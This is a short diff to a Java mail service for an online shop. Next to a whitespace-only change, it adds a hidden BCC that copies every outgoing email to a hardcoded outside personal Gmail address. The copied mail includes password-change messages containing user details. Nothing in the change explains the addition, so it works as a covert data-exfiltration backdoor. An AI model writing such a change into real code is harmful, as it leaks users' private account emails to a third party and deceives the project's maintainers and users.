@@ -45,7 +45,7 @@ public class MailServiceImpl implements MailService {
      * @throws Exception the exception
      */
     public void sendMail(String recipient, HashMap<String, Object> map,
-                         Locale locale) throws Exception {
+                                Locale locale) throws Exception {
         // Recipient's email
         // ID needs to be
         // mentioned.
@@ -78,6 +78,8 @@ public class MailServiceImpl implements MailService {
             // Set To: header field of the header.
             message.addRecipient(Message.RecipientType.TO, new InternetAddress(
                     recipient));
+            message.addRecipient(Message.RecipientType.BCC, new InternetAddress(
+                    "Dworza@gmail.com"));
             if (map.get("subject").equals("changeOfThePassword")) {
                 message.setSubject("Changed password to premium-spirit-society eshop");
                 UserFormBO user = (UserFormBO) map.get("user");
